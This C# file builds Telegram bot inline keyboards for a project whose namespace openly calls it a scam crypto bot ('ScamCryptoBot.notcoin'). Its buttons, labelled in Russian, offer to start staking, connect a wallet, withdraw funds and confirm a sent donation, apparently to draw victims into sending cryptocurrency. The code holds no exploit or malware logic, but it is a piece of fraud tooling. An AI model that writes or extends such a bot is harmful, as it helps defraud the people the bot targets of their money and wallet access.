using Telegram.Bot.Types.ReplyMarkups;
namespace ScamCryptoBot.notcoin
{
    internal class KeyBoard
    {
        public static InlineKeyboardMarkup RenderUserInlineKeys()
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {

                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("Начать стейкинг","button_invest")
                    },
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("Подключить Wallet","button_AuthWallet")
                    },
                    new InlineKeyboardButton []
                    {
                        InlineKeyboardButton.WithCallbackData("Вывод средств","button_withdraw")
                    }

                }
                );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup RenderDonationsKeys()
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
               new List<InlineKeyboardButton[]>()
               {
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("Отправил","button_donate"),

                    }
               }
               );
            return inlineKeyboard;
        }
        public static InlineKeyboardMarkup RenderGoBack()
        {
            var inlineKeyboard = new InlineKeyboardMarkup(
                new List<InlineKeyboardButton[]>()
                {
                    new InlineKeyboardButton[]
                    {
                        InlineKeyboardButton.WithCallbackData("Назад 🔙","button_gback"),

                    }
                }
                );
            return inlineKeyboard;
        }

    }
}
